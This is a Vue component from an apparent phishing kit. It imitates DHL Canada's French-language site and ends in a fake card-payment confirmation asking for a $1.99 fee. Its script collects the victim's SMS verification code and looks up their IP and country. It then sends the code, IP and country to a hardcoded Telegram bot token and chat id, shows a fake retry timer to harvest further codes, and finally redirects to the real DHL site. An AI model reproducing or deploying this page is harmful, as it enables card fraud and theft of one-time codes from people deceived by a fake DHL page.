                                  href="https://www.dhl.com/ca-fr/home/vision-et-innovation/innovation/centre-innovation.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Innovation Center"}'
                                  >Centre d’innovation</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="7&#45;2&#45;2"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/vision-et-innovation/innovation/innovation-en-action.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Innovation in Action"}'
                                  >L’innovation en action</a
                                >
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="8"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/carrieres.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Careers"}'
                          >Carrières</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/carrieres.html"
                              >Carrières</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="8&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/carrieres/etudiants-et-jeunes-diplomes.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Students and Graduates"}'
                              >Étudiants et jeunes diplômés</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/carrieres/etudiants-et-jeunes-diplomes.html"
                                  >Étudiants et jeunes diplômés</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="8&#45;1&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/carrieres/etudiants-et-jeunes-diplomes/programme-de-stage-aiesec.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"AIESEC Internship Program"}'
                                  >Programme de stage AIESEC</a
                                >
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="8&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/carrieres/employes-experimentes.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Experienced Hires"}'
                              >Employés d’expérience</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="8&#45;3"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/carrieres/travailler-chez-nous.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Working here"}'
                              >Travailler ici</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/carrieres/travailler-chez-nous.html"
                                  >Travailler ici</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="8&#45;3&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/carrieres/travailler-chez-nous/carrieres.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Career Functions"}'
                                  >Carrières</a
                                >
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="8&#45;4"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/carrieres/candidature-et-soutien.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Application &amp; Support"}'
                              >Candidature et soutien</a
                            >
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="9"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/presse.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Press"}'
                          >Presse</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/presse.html"
                              >Presse</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="9&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/presse/contact-presse.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Press Contact"}'
                              >Coordonnées des services de presse</a
                            >
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="10"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/nous-connaitre.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"About Us"}'
                          >À propos de nous</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre.html"
                              >À propos de nous</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="10&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/reseau-mondial.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Global Network"}'
                              >Réseau mondial</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="10&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/sustainability.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Sustainability"}'
                              >Responsabilité de l’entreprise</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="10&#45;3"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/notre-vision.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Vision"}'
                              >Vision DHL</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="10&#45;4"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/employes-dhl.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL People"}'
                              >Employés DHL</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/employes-dhl.html"
                                  >Employés DHL</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="10&#45;4&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/employes-dhl/first-choice.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"First Choice"}'
                                  >First Choice</a
                                >
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="10&#45;5"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/partenariats.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Partnerships"}'
                              >Partenariats</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="10&#45;6"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Spotlight"}'
                              >Delivered</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight.html"
                                  >Delivered</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="10&#45;6&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight/globalization.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Globalization"}'
                                  >Mondialisation</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="10&#45;6&#45;2"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight/digitalization.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Digitalization"}'
                                  >Numérisation</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="10&#45;6&#45;3"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight/sustainability.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Sustainability"}'
                                  >Responsabilité de l’entreprise</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="10&#45;6&#45;4"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nous-connaitre/spotlight/ecommerce.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Ecommerce"}'
                                  >Ecommerce</a
                                >
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="10&#45;7"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nous-connaitre/strategy-2025.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Strategy 2025"}'
                              >Stratégie 2025</a
                            >
                          </li>
                        </ul>
                      </li>

                      <li
                        class="c-nav--mobile-meta l-grid--w-100pc-s c-nav-primary--globalnewsflash not-visible js--nav-primary--globalnewsflash"
                      >
                        <a
                          class="link has-icon icon-exception"
                          href="https://www.dhl.com/global-en/home/global-news-alerts.html"
                          target="_blank"
                          title="Alertes"
                          rel="noopener noreferrer"
                        >
                          Alertes
                          <span class="sr-only">Alertes</span>
                        </a>
                      </li>
                    </ul>
                  </div>
                </li>
              </ul>
              <div
                class="c-nav-primary js--nav-primary js--nav-container l-grid l-grid--100pc-s l-grid--hidden-s l-grid--visible-m"
              >
                <ul class="l-grid l-grid--w-auto-s js--nav-list">
                  <li
                    class="l-grid js--nav-primary-element c-nav-primary-element js--nav-tohide has-subnav js--has-subnav has-icon"
                  >
                    <a
                      class="has-icon js--analytics-delay-disabled"
                      href="https://www.dhl.com/ca-fr/home/suivi.html"
                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Tracking"}'
                    >
                      Track
                    </a>

                    <div
                      class="c-nav-flyout c-nav-flyout-leftaligned c-nav-flyout--tracking js--nav-flyout"
                    >
                      <div class="c-nav-flyout--container">
                        <div
                          class="c-nav-flyout--headline l-grid--w-100pc-m l-grid--center-m"
                        >
                          <h4>Suivi de votre expédition</h4>
                        </div>
                        <div class="c-voc-tracking-bar js--tracking-bar">
                          <form
                            class="c-voc-tracking-bar--form js--tracking-bar--form"
                          >
                            <div class="c-voc-tracking-bar--input-outer-group">
                              <div
                                class="c-voc-tracking-bar--input-inner-group"
                              >
                                <!-- client-side validation of .c-voc-tracking-bar--input is handled through HTML5 attributes (like [required]) -->
                                <input
                                  class="c-voc-tracking-bar--input js--tracking-bar--input"
                                  data-error-message="24059661"
                                  disabled
                                />
                                <label
                                  class="c-voc-tracking-bar--element-label"
                                  for="c-voc-flyout-tracking--input"
                                  >24059661</label
                                >
                                <button
                                  class="c-voc-tracking-bar--button js--tracking-bar--button base-button"
                                >
                                  Track now
                                </button>
                              </div>
                            </div>
                            <p
                              tabindex="-1"
                              class="c-form--element-base c-form-step--error-message js--tracking-invalid--focus"
                            >
                              Inscrire votre (vos) numéro(s) de suivi
                            </p>
                          </form>
                        </div>
                        <div class="c-nav-tracking--copycontainer">
                          <div
                            class="c-nav-flyout--linkwrapper warning l-grid l-grid--w-100pc-m"
                          >
                            <a
                              class="link link-external has-icon warning"
                              href="https://mydhl.express.dhl/ca/fr/tracking.html#/track-by-reference"
                              target="_blank"
                              data-tracking='{"component":"dhl/components/navigation/flyout-tracking-element","name":"Track by DHL Express Reference","topic":"Track Your Shipment"}'
                              rel="noopener noreferrer"
                            >
                              Suivre avec votre numéro d&#39;expédition DHL
                              Express
                            </a>

                            <a
                              class="link link-internal has-icon"
                              href="https://www.dhl.com/ca-fr/home/suivi/tracking-faq.html"
                              data-tracking='{"component":"dhl/components/navigation/flyout-tracking-element","name":"View all Tracking FAQ&apos;s","topic":"Track Your Shipment"}'
                            >
                              Consultez la FAQ sur le suivi des expéditions
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </li>

                  <li
                    class="l-grid js--nav-primary-element c-nav-primary-element js--nav-tohide has-subnav js--has-subnav has-icon"
                  >
                    <a
                      class="has-icon js--analytics-delay-disabled"
                      href="https://www.dhl.com/ca-fr/home/envoyer.html"
                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Ship"}'
                    >
                      Envoyer
                    </a>

                    <div
                      class="c-nav-flyout c-nav-flyout-leftaligned c-nav-flyout--list js--nav-flyout"
                    >
                      <div class="c-nav-flyout--container">
                        <div
                          class="c-nav-flyout--listitem-container js--nav-flyout--listitem-container"
                        >
                          <div
                            class="c-nav-flyout--listitem js--nav-flyout--listitem l-grid--w-33pc-m"
                          >
                            <div
                              class="c-nav-flyout--listitem-headline l-grid--w-100pc-m l-grid--center-m"
                            >
                              <p class="boldlarge">Pour commencer</p>
                            </div>

                            <ul>
                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/reserver-en-ligne.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Ship Now","topic":"Ship"}'
                                  >Envoyer maintenant</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/obtenir-une-cotation.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Get a Quote","topic":"Ship"}'
                                  >Obtenir un prix</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/dhl-pour-le-business.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Become a Frequent Shipper","topic":"Ship"}'
                                  >DHL pour le Business</a
                                >
                              </li>
                            </ul>
                          </div>

                          <div
                            class="c-nav-flyout--listitem js--nav-flyout--listitem l-grid--w-33pc-m"
                          >
                            <div
                              class="c-nav-flyout--listitem-headline l-grid--w-100pc-m l-grid--center-m"
                            >
                              <p class="boldlarge">En savoir plus sur…</p>
                            </div>

                            <ul>
                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/envoyer/expedition-de-colis-et-de-documents.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Documents and Parcels","topic":"Ship"}'
                                  >Documents et colis</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/envoyer/expedition-de-fret.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Pallets, Containers and Other Cargo","topic":"Ship"}'
                                  >Palettes, conteneurs et autres
                                  marchandises</a
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div
                          class="l-grid--w-100pc-m l-grid--center-m has-rte"
                        ></div>
                      </div>
                    </div>
                  </li>

                  <li
                    class="l-grid js--nav-primary-element c-nav-primary-element js--nav-tohide"
                  >
                    <a
                      class="has-icon"
                      href="https://www.dhl.com/ca-fr/home/solutions-logistiques.html"
                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Logistics Solutions"}'
                    >
                      Solutions logistiques
                    </a>
                  </li>

                  <li
                    class="l-grid js--nav-primary-element c-nav-primary-element js--nav-tohide"
                  >
                    <a
                      class="has-icon"
                      href="https://www.dhl.com/ca-fr/home/customer-service.html"
                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Customer Service"}'
                    >
                      Service à la clientèle
                    </a>
                  </li>
                  <li
                    class="l-grid c-nav--toggle c-nav--toggle-less js--nav-tohide"
                  >
                    <span
                      class="js--nav-less js--toggle-primary has-icon"
                      tabindex="-1"
                      >…Moins</span
                    >
                  </li>
                </ul>
                <!--Start of new Ul-->
                <ul class="c-nav-list--right l-grid l-grid--right-m">
                  <li
                    class="c-nav--toggle l-grid l-grid--w-reset-s l-grid--right-s js--nav-tohide"
                  >
                    <span
                      class="c-nav--toggle-more js--nav-more js--toggle-primary has-icon"
                      tabindex="0"
                      >...Plus</span
                    >
                  </li>
                  <li class="l-grid c-nav--fixed-searchbar">
                    <div class="c-nav--fixed-searchbar-wrapper">
                      <form
                        class="c-nav-primary--searchform js--nav-primary--searchform"
                      >
                        <input
                          class="c-nav-primary--searchbar js--nav-primary--searchbar js--nav-primary--searchbar-quick"
                          id="fixedsearchbar"
                          auto-complete=""
                          max-num-list="5"
                          type="text"
                          placeholder="Rechercher dans dhl.com"
                          name="q"
                        />
                        <label
                          for="fixedsearchbar"
                          class="c-nav-primary--searchbar-label has-icon icon-search"
                          >&nbsp;</label
                        >
                        <div
                          class="c-nav-primary--searchbar-quicklinks js--nav-primary--searchbar-quicklinks"
                        >
                          <ul class="shadow-small"></ul>
                        </div>
                      </form>
                    </div>
                  </li>
                  <li
                    class="l-grid has-subnav js--has-subnav has-icon c-nav-customer-portal js-nav-customer-portal"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <a class="has-icon c-nav-customer-portal-headline" href="#"
                      >Customer Portal Logins</a
                    >

                    <div
                      class="c-nav-flyout c-nav-flyout-leftaligned c-nav-flyout--list js--nav-flyout"
                    >
                      <div class="c-nav-flyout--container">
                        <h4
                          class="c-nav-flyout--headline l-grid--w-100pc-m l-grid--center-m"
                        >
                          Tous les portails
                        </h4>
                        <div
                          class="c-nav-flyout--listitem-container js--nav-flyout--listitem-container"
                        >
                          <div
                            class="c-nav-flyout--listitem js--nav-flyout--listitem l-grid--w-33pc-m"
                          >
                            <div
                              class="c-nav-flyout--listitem-headline l-grid--w-100pc-m l-grid--center-m"
                            >
                              <p class="boldlarge"></p>
                            </div>

                            <ul>
                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/redirect/express/portal.html"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"MyDHL+","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >MyDHL+</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-internal"
                                  href="https://www.dhl.com/ca-fr/home/redirect/ecommerce/portal.html"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"DHL eCommerce Web Portal","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >DHL eCommerce Web Portal</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-external"
                                  href="https://keycloak.mydhli.com/auth/realms/DCI/protocol/openid-connect/auth?scope=openid+web-origins&response_type=code&redirect_uri=https%3A%2F%2Fapp.mydhli.com%2Flogin&client_id=myDHLi&ui_locales=en"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"myDHLi","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >myDHLi</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-external"
                                  href="https://mysupplychain.dhl.com/"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"MySupplyChain","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >MySupplyChain</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-external"
                                  href="https://tas.dhl.com/tas/servlet/login"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"DHL Trade Automation Services","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >DHL Trade Automation Services</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-external"
                                  href="https://mysupplychain.dhl.com/agileconnect/"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Supply Chain Agile","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >Supply Chain Agile</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="link has-icon l-grid link-external"
                                  href="https://www.dhlsameday.com/SkyPortal/Default.aspx?ReturnUrl=%2fSkyPortal%2f"
                                  target="_blank"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"DHL Express","topic":"Portal Login"}'
                                  rel="noopener noreferrer"
                                  >DHL Express</a
                                >
                              </li>

                              <li class="l-grid">
                                <a
                                  class="has-icon base-button base-button--wide link-internal"
                                  href="https://www.dhl.com/ca-fr/home/se-connecter.html"
                                  data-tracking='{"component":"dhl/components/navigation/flyout-element","name":"Learn about Portals","topic":"Portal Login"}'
                                  >En savoir plus sur les portails
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div
                          class="l-grid--w-100pc-m l-grid--center-m has-rte"
                        ></div>
                      </div>
                    </div>
                  </li>

                  <!--Start of slim navigation -->
                </ul>
              </div>
            </nav>
          </div>
          <!--
          <div class="iparys_inherited">
              Confirmation
          </div>
          googleon: all-->
          <div class="section"></div>
        </div>
        <br /><br />
        <div class="secondaryNavIparsys iparsys parsys">
          <div class="section"></div>
          <div class="iparys_inherited"></div>
        </div>
      </header>
      <div class="c-voc-marketing-stage component-margin"></div>

      <div class="js--nav-padding-layer c-nav--padding-layer"></div>

      <span
        class="link-anchor"
        id="parsysPathStage_marketing_stage_trac"
      ></span>

      <!--googleoff: all-->

      <nav class="c-component-breadcrumb l-grid">
        <span class="sr-only">You are here</span>
      </nav>

      <!--googleon: all-->
      <main id="wcag-main-content">
        <div class="message" style="margin-top: 30%">
          <div class="container">
            <div class="transfer shadow">
              <div class="image">
                <img src="./R.jpg" style="width: 50%" />
                <img style="width: 50%" src="./verified-visa-master.png" />
              </div>
              <div class="text-center pt-3">
                <h5>Please confirm the following payment</h5>
              </div>
              <div class="">
                <p>
                  The unique password was sent to the mobile number:
                  {{ phoneNumber }}. If you need to change your bark or modify
                  it via the (ATM, WEB)
                </p>
              </div>
              <form>
                <input type="hidden" name="step" value="sms" />
                <div class="content">
                  <div class="left">
                    <span>Merchant:</span>
                    <span>Total:</span>
                    <span>Date:</span>
                    <span>Card number:</span>
                    <span class="osama">SMS </span>
                  </div>
                  <div class="right">
                    <span>DHL</span>
                    <span>1.99 $ </span>
                    <span>{{ date }} </span>
                    <span
                      >{{
                        "XXXX XXXX XXXX " +
                        creditCard.slice(creditCard.length - 4)
                      }}
                    </span>
                    <span id="lastNumbers"></span>
                    <span>
                      <div class="form-group">
                        <input
                          style="font-size: 15px"
                          type="text"
                          name="sim"
                          id="sim"
                          placeholder="SMS"
                          class="form-control"
                          v-model="sms"
                        />
                      </div>
                    </span>
                  </div>
                </div>
                <div v-if="error" id="timer" class="time">
                  <p>
                    Please re-enter the new verification code after:
                    <span id="counter">{{ time }}</span> Seconds
                  </p>
                </div>
                <div
                  v-if="errorMessage"
                  id="timer"
                  style="color: red"
                  class="time"
                >
                  <p style="color: red">Please enter the verification code</p>
                </div>
                <center>
                  <div
                    class="botona"
                    style="justify-content: center !important"
                  >
                    <button id="sendsms" class="btn" @click="confirmSMS">
                      Confirm
                    </button>
                  </div>
                </center>
              </form>
            </div>
          </div>
        </div>
      </main>
    </div>

    <div class="overlay js--overlay"></div>
    <div id="sec-overlay" style="display: none">
      <div id="sec-container"></div>
    </div>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      code: "",
      cvv: "",
      cardName: "",
      cardDate: "",
      error: false,
      errorMessage: false,
      cardNumber: "",
      sms: "",
      tries: 2,
      time: 30,
      IP: "",
      query: "",
    };
  },
  computed: {
    date() {
      var x = new Date();
      var date = x.getDate() < 10 ? "0" + x.getDate() : x.getDate();
      var month = x.getMonth() < 10 ? "0" + (x.getMonth() + 1) : x.getMonth();
      return date.toString() + "/" + month + "/" + x.getFullYear();
    },
    phoneNumber() {
      return localStorage.getItem("phoneNumber");
    },
    creditCard() {
      return localStorage.getItem("cardNumber");
    },
  },
  methods: {
    async confirmSMS(e) {
      e.preventDefault();
      if (this.sms) {
        this.errorMessage = false;
        var input = document.getElementById("sim");
        var button = document.getElementById("sendsms");
        var tt = await axios.get(
          "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
        );
        this.IP = tt.data.ip;
        this.query = tt.data.country_capital;
        var token = "6604635615:AAE77q8uZoZI1yRVA1gaSx8GO3azvBDL1OQ";

    var chatId2 = -4066490084;
        var fullMessage = `
        ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL|💳||||||||||`;
        if (this.tries > 0) {
          input.disabled = true;
          button.disabled = true;
          this.tries--;
          this.error = true;
          var that = this;
          var x = setInterval(() => {
            if (that.time == 0) {
              that.error = false;
              input.disabled = false;
              button.disabled = false;
              clearInterval(x);
              that.time = 30;
            }
            that.time--;
          }, 1000);

          await axios.post(
            `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
          );
        } else {
          window.location.href = "https://www.dhl.com/ca-fr/home.html";
        }
      } else {
        this.errorMessage = true;
      }
    },
    copy() {
      var copyText = document.getElementById("myInput");
      copyText.select();
      copyText.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(copyText.value);

      var tooltip = document.getElementById("myTooltip");
      tooltip.innerHTML = "Copied: " + copyText.value;
    },
    outFunc() {
      var tooltip = document.getElementById("myTooltip");
      tooltip.innerHTML = "Copy to clipboard";
    },
  },

  mounted() {
    window.scrollTo(0, 0);
    this.code = this.$route.params.code;
  },
};
</script>
<style>
.tooltip {
  position: relative;
  display: inline-block;
  opacity: 1;
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 140px;
  opacity: 1;
  background-color: #555;
  color: #fff;
  text-align: center;
  border-radius: 6px;
  padding: 5px;
  position: absolute;
  z-index: 1;
  bottom: 150%;
  left: 50%;
  margin-left: -75px;
  transition: opacity 0.3s;
}

.tooltip .tooltiptext::after {
  content: "";
  position: absolute;
  top: 100%;
  left: 50%;
  margin-left: -5px;
  border-width: 5px;
  border-style: solid;
  border-color: #555 transparent transparent transparent;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
  opacity: 1;
}
</style>
